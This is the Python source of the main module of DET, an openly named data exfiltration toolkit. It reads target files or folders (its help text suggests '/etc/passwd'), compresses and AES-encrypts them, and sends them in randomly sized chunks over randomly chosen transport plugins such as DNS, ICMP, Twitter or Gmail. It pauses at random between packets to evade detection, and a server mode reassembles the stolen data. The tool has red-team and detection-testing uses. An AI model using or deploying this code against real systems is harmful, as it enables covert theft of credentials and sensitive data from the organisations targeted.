import os
import random
import queue
import threading
import hashlib
import argparse
import sys
import string
import time
import json
import struct
import tempfile
from random import randint
from os import listdir
from os.path import isfile, join, dirname
from Crypto.Cipher import AES
from zlib import compress, decompress
from . import dukpt
from . import plugins
from binascii import unhexlify, hexlify
import importlib
import traceback
from io import StringIO, BytesIO

if getattr(sys, 'frozen', False) and hasattr(sys, '_MEIPASS'):
    if "_MEI" in sys._MEIPASS:
        # one file mode
        os.chdir(dirname(sys.executable))
    else:
        # one folder mode
        os.chdir(sys._MEIPASS)

KEY = ""
MIN_TIME_SLEEP = 1
MAX_TIME_SLEEP = 30
MIN_BYTES_READ = 1
MAX_BYTES_READ = 500
COMPRESSION    = True
files = {'pending': {}}
threads = []
config = None
dukpt_client = None
dukpt_server = None
app = None

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

def display_message(message):
    print("[%s] %s" % (time.strftime("%Y-%m-%d.%H:%M:%S", time.gmtime()), message))


def warning(message):
    display_message("%s%s%s" % (bcolors.WARNING, message, bcolors.ENDC))


def ok(message):
    display_message("%s%s%s" % (bcolors.OKGREEN, message, bcolors.ENDC))


def info(message):
    display_message("%s%s%s" % (bcolors.OKBLUE, message, bcolors.ENDC))

if os.name == "nt":
    warning, ok, info = [lambda m: display_message(m)]*3

# http://stackoverflow.com/questions/12524994/encrypt-decrypt-using-pycrypto-aes-256
def aes_encrypt(message, key=KEY):
    try:
        ksn = ""
        # If using DUKPT, generate a new key
        if dukpt_client:
            info = dukpt_client.gen_key()
            key = info['key']
            ksn = info['ksn']
        # Generate random CBC IV
        iv = os.urandom(AES.block_size)

        # Derive AES key from passphrase
        aes = AES.new(hashlib.sha256(key.encode()).digest(), AES.MODE_CBC, iv)

        # Add PKCS5 padding
        pad = lambda s: s + (AES.block_size - len(s) % AES.block_size) * chr(AES.block_size - len(s) % AES.block_size).encode()

        # Return data size, iv and encrypted message
        return iv + ksn.encode() + aes.encrypt(pad(message))
    except:
        traceback.print_exc()
        return None

def aes_decrypt(message, key=KEY):
    try:
        # Retrieve CBC IV
        iv = message[:AES.block_size]
        if dukpt_server:
            ksn = message[AES.block_size:AES.block_size+dukpt_server.KSN_LEN]
            message = message[AES.block_size+dukpt_server.KSN_LEN:]
            key = dukpt_server.gen_key(ksn)
        else:
            message = message[AES.block_size:]

        # Derive AES key from passphrase
        aes = AES.new(hashlib.sha256(key.encode()).digest(), AES.MODE_CBC, iv)
        message = aes.decrypt(message)

        # Remove PKCS5 padding
        unpad = lambda s: s[:-ord(s[len(s) - 1:])]

        return unpad(message)
    except:
        traceback.print_exc()
        return None

# Do a md5sum of the file
def md5(f):
    return hashlib.md5(f.read()).hexdigest()


function_mapping = {
    'display_message': display_message,
    'warning': warning,
    'ok': ok,
    'info': info,
    'aes_encrypt' : aes_encrypt,
    'aes_decrypt': aes_decrypt
}


class Exfiltration(object):

    def __init__(self, results, KEY):
        self.KEY = KEY
        self.plugin_manager = None
        self.plugins = {}
        self.results = results
        self.target = "127.0.0.1"
        self.message_queue = queue.Queue()

        # Load plugins
        # sys.path.insert(0, path)
        info(f"{len(plugins.available())} plugins available")
        for fname in plugins.available():
            if self.should_use_plugin(fname):
                if fname not in config["plugins"]:
                    warning(f"{fname} config not found in config file, skipping.")
                    continue
                mod = importlib.import_module(f"det.plugins.{fname}")
                mod.Plugin(self, config["plugins"][fname])
        info(f"Loaded {len(self.plugins)} plugins")

    def should_use_plugin(self, plugin_name):
        # if the plugin has been specified specifically (-p twitter)
        if self.results.plugin and plugin_name not in self.results.plugin.split(','):
            return False
        # if the plugin is not in the exclude param
        elif self.results.exclude and plugin_name in self.results.exclude.split(','):
            return False
        else:
            return True

    def register_plugin(self, transport_method, functions):
        self.plugins[transport_method] = functions

    def get_plugins(self):
        return self.plugins

    def aes_encrypt(self, message):
        return aes_encrypt(message, self.KEY)

    def aes_decrypt(self, message):
        return aes_decrypt(message, self.KEY)

    def log_message(self, mode, message):
        if mode in function_mapping:
            function_mapping[mode](message)

    def get_random_plugin(self):
        plugin_name = random.sample(sorted(self.plugins), 1)[0]
        return plugin_name, self.plugins[plugin_name]['send']

    def use_plugin(self, plugins):
        tmp = {}
        for plugin_name in plugins.split(','):
            if (plugin_name in self.plugins):
                tmp[plugin_name] = self.plugins[plugin_name]
        self.plugins.clear()
        self.plugins = tmp

    def remove_plugins(self, plugins):
        for plugin_name in plugins:
            if plugin_name in self.plugins:
                del self.plugins[plugin_name]
        display_message("{0} plugins will be used".format(
            len(self.get_plugins())))

    def register_file(self, message):
        global files
        jobid = message[0]
        if jobid not in files:
            f = {}
            f['checksum'] = message[3].lower()
            f['filename'] = message[1].lower()
            f['data'] = {}
            f['packets_len'] = -1
            files[jobid] = f
            ok(f"[{jobid}] REGISTER packet for file {f['filename']} with checksum {f['checksum']}")
            if jobid in files['pending']:
                warning(f"[{jobid}] Found old pending data, parsing now...")
                for _ in range(len(files['pending'][jobid])):
                    self.process_data(files['pending'][jobid].pop())
                if len(files['pending'][jobid]) == 0:
                        del files['pending'][jobid]
        else:
            warning(f"[{jobid}] REGISTER packet received, but it's a duplicate, ignoring...")

    def retrieve_file(self, jobid):
        global files
        fname = files[jobid]['filename']
        filename = "%s.%s" % (fname.replace(
            os.path.pathsep, ''), time.strftime("%Y-%m-%d.%H:%M:%S", time.gmtime()))

        ordered_data = [p[1] for p in sorted(files[jobid]['data'].items())]
        content = ''.join(ordered_data)
        content = unhexlify(content)
        content = aes_decrypt(content, self.KEY)
        if COMPRESSION:
            content = decompress(content)
        try:
            with open(filename, 'wb') as f:
                f.write(content)
        except IOError as e:
            warning(f"Got {str(e)}: cannot save file {filename}")
            raise e

        if (files[jobid]['checksum'] == md5(open(filename, 'rb'))):
            ok(f"File {fname} recovered")
        else:
            warning(f"File {fname} corrupt!")

        del files[jobid]

    def retrieve_data(self, data):
        self.message_queue.put(data)

    def listen(self):
        while True:
            data = self.message_queue.get()
            self.process_data(data)
            self.message_queue.task_done()

    def store_pending_data(self, jobid, data):
        global files
        if not jobid in files['pending']:
            files['pending'][jobid] = []
        files['pending'][jobid].append(data)

    def process_data(self, data):
        global files
        try:
            message = data
            if (message.count("|!|") >= 2):
                rcvd_bytes=len(message)
                message = message.split("|!|")
                jobid = message[0]
                info(f"[{jobid}] Received {rcvd_bytes} bytes")

                # register packet
                if (message[2] == "REGISTER"):
                    self.register_file(message)
                # done packet
                elif (message[2] == "DONE"):
                    if jobid not in files:
                        warning(f"[{jobid}][!] received DONE packet for unknown JOBID! Storing as pending.")
                        self.store_pending_data(jobid, data)
                        return
                    files[jobid]['packets_len'] = int(message[1])
                    #Check if all packets have arrived
                    if files[jobid]['packets_len'] == len(files[jobid]['data']):
                        warning(f"[{jobid}][!] DONE packet received")
                        self.retrieve_file(jobid)
                    else:
                        warning(f"[{jobid}][!] Received the last packet, but some are still missing. Waiting for the rest...")
                # data packet
                else:
                    packet_nr = int(message[1])
                    # making sure there's a jobid for this file
                    if (jobid in files and packet_nr not in files[jobid]['data']):
                        info(f"[{jobid}] DATA packet #{packet_nr} received")
                        files[jobid]['data'][packet_nr] = ''.join(message[2:])
                        #In case this packet was the last missing one
                        if files[jobid]['packets_len'] == len(files[jobid]['data']):
                            warning(f"[{jobid}] last DATA packet received, reconstructing file")
                            self.retrieve_file(jobid)
                    elif jobid in files and packet_nr in files[jobid]['data']:
                        warning(f"[{jobid}] DUPLICATE DATA file received, ignoring.")
                    else:
                        self.store_pending_data(jobid, data)
                        warning(f"[{jobid}][!] received DATA packet for unknown JOBID! Storing as pending.")
        except Exception:
            traceback.print_exc()
            raise
            pass


class ExfiltrateFile(threading.Thread):

    def __init__(self, exfiltrate, file_to_send, plugin_name=None):
        threading.Thread.__init__(self)
        self.file_to_send = file_to_send
        self.exfiltrate = exfiltrate
        self.jobid = ''.join(random.sample(
            string.ascii_letters + string.digits, 7))
        self.checksum = '0'
        self.daemon = True
        self.plugin_name = plugin_name

    def run(self):
        # checksum
        if self.file_to_send == 'stdin':
            file_content = sys.stdin.read()
            buf = BytesIO(file_content)
            e = BytesIO(file_content)
        else:
            with open(self.file_to_send, 'rb') as f:
                file_content = f.read()
            buf = BytesIO(file_content)
            e = BytesIO(file_content)
        self.checksum = md5(buf)
        del file_content
        # registering packet
        if not self.plugin_name:
            plugin_name, plugin_send_function = self.exfiltrate.get_random_plugin()
        else:
            plugin_name = self.plugin_name
            plugin_send_function = self.exfiltrate.get_plugins()[plugin_name]['send']
        ok("Using {0} as transport method".format(plugin_name))

        warning("[!] Registering packet for the file")
        data = "%s|!|%s.%s|!|REGISTER|!|%s" % (
            self.jobid, os.path.basename(self.file_to_send), plugin_name, self.checksum)
        plugin_send_function(data)

        time_to_sleep = randint(1, MAX_TIME_SLEEP)
        info("Sleeping for %s seconds" % time_to_sleep)
        time.sleep(time_to_sleep)

        # sending the data
        f = tempfile.SpooledTemporaryFile()
        data = e.read()
        if COMPRESSION:
            data = compress(data)
        f.write(aes_encrypt(data, self.exfiltrate.KEY))
        f.seek(0)
        e.close()

        packet_index = 0
        while (True):
            data_file = hexlify(f.read(randint(MIN_BYTES_READ, MAX_BYTES_READ))).decode()
            if not data_file:
                break
            plugin_name, plugin_send_function = self.exfiltrate.get_random_plugin()
            ok("Using {0} as transport method".format(plugin_name))
            # info("Sending %s bytes packet" % len(data_file))

            data = "%s|!|%s|!|%s" % (self.jobid, packet_index, data_file)
            plugin_send_function(data)
            packet_index += 1

            time_to_sleep = randint(1, MAX_TIME_SLEEP)
            info("Sleeping for %s seconds" % time_to_sleep)
            time.sleep(time_to_sleep)

        # last packet
        plugin_name, plugin_send_function = self.exfiltrate.get_random_plugin()
        ok("Using {0} as transport method".format(plugin_name))
        data = "%s|!|%s|!|DONE" % (self.jobid, packet_index)
        plugin_send_function(data)
        f.close()
        sys.exit(0)

def main():
    global MAX_TIME_SLEEP, MIN_TIME_SLEEP, KEY, MAX_BYTES_READ, MIN_BYTES_READ, COMPRESSION
    global threads, config
    global dukpt_client, dukpt_server
    global app

    parser = argparse.ArgumentParser(
        prog='det.py',
        description='Data Exfiltration Toolkit (@PaulWebSec)')
    parser.add_argument('-c', action="store", dest="config", default=None,
                        help="Configuration file (eg. '-c ./config-sample.json')")
    parser.add_argument('-f', action="append", dest="file",
                        help="File to exfiltrate (eg. '-f /etc/passwd')")
    parser.add_argument('-d', action="store", dest="folder",
                        help="Folder to exfiltrate (eg. '-d /etc/')")
    parser.add_argument('-p', action="store", dest="plugin",
                        default=None, help="Plugins to use (eg. '-p dns,twitter')")
    parser.add_argument('-e', action="store", dest="exclude",
                        default=None, help="Plugins to exclude (eg. '-e gmail,icmp')")
    listenMode = parser.add_mutually_exclusive_group()
    listenMode.add_argument('-L', action="store_true",
                        dest="listen", default=False, help="Server mode")
    listenMode.add_argument('-Z', action="store_true",
                        dest="proxy", default=False, help="Proxy mode")
    listenMode.add_argument('-T', action="store_true", 
                        dest="test_all", default=False, help="Test all protocols")
    results = parser.parse_args()

    if (results.config is None):
        print("Specify a configuration file!")
        parser.print_help()
        sys.exit(-1)

    with open(results.config) as data_file:
        config = json.load(data_file)

    # catch Ctrl+C
    #signal.signal(signal.SIGINT, signal_handler)
    ok("CTRL+C to kill DET")

    MIN_TIME_SLEEP = int(config['min_time_sleep'])
    MAX_TIME_SLEEP = int(config['max_time_sleep'])
    MIN_BYTES_READ = int(config['min_bytes_read'])
    MAX_BYTES_READ = int(config['max_bytes_read'])
    COMPRESSION    = bool(config['compression'])
    if 'IPEK' in config:
        IPEK = config['IPEK']
        KSN  = config['KSN']
        dukpt_client = dukpt.Client(unhexlify(IPEK), unhexlify(KSN))
    elif 'BDK' in config:
        BDK  = config['BDK']
        dukpt_server = dukpt.Server(unhexlify(BDK))
    else:
        KEY  = config['AES_KEY']
    app = Exfiltration(results, KEY)

    # LISTEN/PROXY MODE
    if (results.listen or results.proxy):
        threads = []
        plugins = app.get_plugins()
        for plugin in plugins:
            if results.listen:
                thread = threading.Thread(target=plugins[plugin]['listen'])
            elif results.proxy:
                thread = threading.Thread(target=plugins[plugin]['proxy'])
            thread.daemon = True
            thread.start()
            threads.append(thread)
        
        # Keep listening until a CTRL+C is sent
        try:
            app.listen() # Blocking call
        except KeyboardInterrupt:
            pass

    # EXFIL mode
    else:
        if (results.folder is None and results.file is None):
            warning("[!] Specify a file or a folder!")
            parser.print_help()
            sys.exit(-1)
        if (results.folder):
            files = ["{0}{1}".format(results.folder, f) for
                     f in listdir(results.folder)
                     if isfile(join(results.folder, f))]
        else:
            files = list(set(results.file))

        threads = []
        for file_to_send in files:
            info("Launching thread for file {0}".format(file_to_send))
            if not results.test_all:
                thread = ExfiltrateFile(app, file_to_send)
                threads.append(thread)
                thread.daemon = True
                thread.start()
            else:
                for plugin_name in app.get_plugins().keys():
                    thread = ExfiltrateFile(app, file_to_send, plugin_name)
                    thread.daemon = True
                    threads.append(thread)
                    thread.start()
        
        # Wait for all threads to join
        try:
            for thread in threads:
                thread.join()
        except KeyboardInterrupt:
            pass

    ok("Goodbye!")

if __name__ == '__main__':
    main()
